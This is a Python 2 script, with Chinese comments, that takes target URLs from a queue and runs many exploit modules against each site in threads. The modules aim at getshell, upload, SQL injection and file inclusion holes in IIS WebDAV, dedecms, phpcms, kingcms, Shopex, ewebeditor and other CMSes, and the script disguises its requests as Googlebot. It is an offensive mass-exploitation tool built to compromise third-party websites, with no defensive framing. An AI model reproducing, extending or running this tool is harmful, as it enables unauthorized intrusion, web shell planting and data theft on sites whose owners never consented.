#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import threading
import sys
import os
import urllib2
import time
import Class_Queue #消息队列机制
sys.path.append('e_x_p')
sys.path.append('b_c')
sys.path.append('cms')
sys.path.append('IIS')


import IIS.exp_IIS_webdav   #IIS  写入漏洞
import cms.exp_cmseasy_IIS6_jx     #cmseasy文件上传+IIS6解释漏洞
import cms.exp_dedecms_getshell  #dedecms漏洞getshell
import cms.exp_phpcmsv9_getshell  #php cms注入漏洞及后台文件权限未验证  PHPcms V9 任意文件读取漏洞
import cms.exp_dedecms_yijuhua  #dede 5.66官方一句话
import cms.exp_kingcms_getshell #kingcms Getshell漏洞
import cms.exp_etcms_Upload_shell #易通cms上传shell漏洞
import e_x_p.exp_Upload_ewebeditor_asp_2_1_6  #ewebeditor asp版 2.1.6 上传漏洞

import cms.sql_dede_57_sp1 #dedecms search注入  dede 5.7 sp1

import cms.bc_DedeCms_5x   #DedeCms 5.x 本地文件包含漏洞
import cms.bc_dedecms_search_php      #dedecms 注入  /plus/search.php

import b_c.bc_shopex_4_8_5  #Shopex 4.8.5 SQL Injection Exp
import b_c.bc_nfsj_jlxt_wrtx #通杀南方数据、良精系统、网软天下等

class class_threading(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def open_url_data(self,url):  #读取网页内容
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except:
            return 0

    def run(self):
        try:
            if Class_Queue.Bopenurl.empty():   #判断队列是否为空
                print u"已经没有可操作的URL了"
                time.sleep(60)
                self.run()
            self.URL = Class_Queue.Bopenurl.get(0.5)  #get()方法从队头删除并返回一个项目
#            if self.URL=="":
#                time.sleep(20)
#                self.run()
            #URL="www.sttc.cn"
            ss=self.open_url_data("http://"+self.URL)
            if ss==0:  #读取网页内容
                print u"%s:URL网站可能无法打开"%(self.URL)
                time.sleep(5)
                self.run()
            #self.URL="www.xitong8.com"
            self.CS_URL(self.URL)
            self.run()
        except Exception,e:
            print e
            self.run()
            return 0


    def CS_URL(self,URL):
        try:
            print u"%s开始扫描--%s"%(URL,time.strftime('%Y.%m.%d-%H.%M.%S'))
            #IIS写入漏洞扫描
            threads = []
            for i in range(1):
                threads.append(IIS.exp_IIS_webdav.IIS(URL))
            for t in threads:
                t.start()
            #cmseasy文件上传+IIS6解释漏洞
            threads = []
            for i in range(1):
                threads.append(cms.exp_cmseasy_IIS6_jx.cms(URL))
            for t in threads:
                t.start()
            #dedecms漏洞getshell
            threads = []
            for i in range(1):
                threads.append(cms.exp_dedecms_getshell.dedecms_getshell(URL))
            for t in threads:
                t.start()
            #php cms注入漏洞及后台文件权限未验证
            threads = []
            for i in range(1):
                threads.append(cms.exp_phpcmsv9_getshell.phpcmsv9_getshell(URL))
            for t in threads:
                t.start()
            #官方一句话
            threads = []
            for i in range(1):
                threads.append(cms.exp_dedecms_yijuhua.dedecms_yijuhua(URL))
            for t in threads:
                t.start()
            #kingcms Getshell漏洞
            threads = []  #线程
            for i in range(1):  #nthreads=10  创建10个线程
                threads.append(cms.exp_kingcms_getshell.kingcms_getshell(URL))
            for t in threads:
                t.start()
            #易通cms上传shell漏洞
            threads = []  #线程
            for i in range(1):  #nthreads=10  创建10个线程
                threads.append(cms.exp_etcms_Upload_shell.etcms_Upload_shell(URL))
            for t in threads:
                t.start()
            time.sleep(10)
            #DedeCms 5.x 本地文件包含漏洞
            threads = []  #线程
            for i in range(1):
                threads.append(cms.bc_DedeCms_5x.bc_DedeCms_5x(URL))
            for t in threads:
                t.start()
             #dedecms search注入  dede 5.7 sp1
            threads = []  #线程
            for i in range(1):
                threads.append(cms.sql_dede_57_sp1.sql_dede_57_sp1(URL))
            for t in threads:
                t.start()
            #Shopex 4.8.5 SQL Injection Exp
            threads = []  #线程
            for i in range(1):  #nthreads=10  创建10个线程
                threads.append(b_c.bc_shopex_4_8_5.bc_shopex_4_8_5(URL))
            for t in threads:
                t.start()
            #ewebeditor asp版 2.1.6 上传漏洞
            threads = []  #线程
            for i in range(1):
                threads.append(e_x_p.exp_Upload_ewebeditor_asp_2_1_6.ewebeditor_Upload(URL))
            for t in threads:
                t.start()
            #dedecms 注入  /plus/search.php
            threads = []  #线程
            for i in range(1):
                threads.append(cms.bc_dedecms_search_php.bc_dedecms_search_php(URL))
            for t in threads:
                t.start()
            #通杀南方数据、良精系统、网软天下等
                threads = []  #线程
            for i in range(1):  #nthreads=10  创建10个线程
                threads.append(b_c.bc_nfsj_jlxt_wrtx.bc_nfsj_jlxt_wrtx(URL))
            for t in threads:
                t.start()
                #print u"%s扫描结束"%(URL)
            return 0
        except Exception,e:
            print e
            return 0

################################################
if __name__=='__main__':
#启动线程控制漏洞扫描
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(class_threading())
    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程


